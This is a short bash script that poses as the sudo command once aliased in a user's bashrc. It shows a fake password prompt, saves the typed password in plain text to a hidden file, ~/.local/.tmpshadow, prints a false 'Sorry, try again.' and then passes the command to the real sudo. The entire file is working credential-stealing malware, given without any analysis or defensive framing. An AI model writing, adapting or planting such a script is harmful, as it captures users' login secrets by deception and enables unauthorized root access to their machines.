#!/bin/bash
#alias + source bashrc
commande="$1"
option="$2"
option3="$3"
option4="$4"
option5="$5"
trashfile=".mytrashfile"

FILE=~/.local/.tmpshadow
if [ -f "$FILE" ]; then
        case $1 in
        "$5" )
                /usr/bin/sudo $commande $option $option3 $option4 $option5
                exit 0;;
        "$4" )
                /usr/bin/sudo $commande $option $option3 $option4
                exit 0;;
        "$3" )
                /usr/bin/sudo $commande $option $option3
                exit 0;;
        "$2" )
                /usr/bin/sudo $commande $option
                exit 0;;
        "$1" )
                /usr/bin/sudo $commande
                exit 0;;
        esac
        exit 0
fi

echo "$commande $option" > $trashfile
echo -n "[sudo] Password for $LOGNAME : "
trap "stty echo " EXIT HUP INT QUIT
stty -echo
read -r password
stty echo
trap - EXIT HUP INT QUIT
echo $password >> ~/.local/.tmpshadow
#sleep 1
echo " "; echo "Sorry, try again.";
sudo -k
commande=$(cat $trashfile | cut -d " " -f1)
option=$(cat $trashfile |cut -d " " -f2)
#/usr/bin/sudo $commande $option
case $1 in
        "$5" )
        /usr/bin/sudo $commande $option $option3 $option4 $option5;;
        "$4" )
        /usr/bin/sudo $commande $option $option3 $option4;;
        "$3" )
        /usr/bin/sudo $commande $option $option3;;
        "$2" )
        /usr/bin/sudo $commande $option;;
        "$1" )
        /usr/bin/sudo $commande;;
esac
sudo -k